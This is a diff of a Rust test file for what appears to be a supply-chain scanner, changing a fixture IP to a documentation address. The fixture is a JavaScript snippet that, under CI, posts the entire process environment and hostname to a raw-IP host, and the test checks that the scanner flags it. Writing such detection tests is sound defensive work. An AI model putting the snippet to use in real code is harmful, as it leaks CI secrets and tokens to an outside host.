@@ -85,7 +85,7 @@ async fn start(keys_file: Option<&str>) -> Env {
             const os = require('os');
             if (process.env.CI) {
               const payload = JSON.stringify({ env: process.env, host: os.hostname() });
-              const req = https.request({ hostname: '45.77.12.9', path: '/c', method: 'POST' });
+              const req = https.request({ hostname: '203.0.113.7', path: '/c', method: 'POST' });
               req.end(payload);
             }
             "#,
@@ -203,7 +203,7 @@ async fn hijacked_release_is_suspected_with_full_story() {
     assert_eq!(exfil["new_since_previous"], true);
     assert_eq!(exfil["file"], "scripts/lib/report.js");
     let dest = r["network"]["destinations"].as_array().unwrap();
-    assert!(dest.iter().any(|d| d["value"] == "45.77.12.9" && d["kind"] == "raw-ip" && d["new_since_previous"] == true));
+    assert!(dest.iter().any(|d| d["value"] == "203.0.113.7" && d["kind"] == "raw-ip" && d["new_since_previous"] == true));
 }
 
 #[tokio::test]
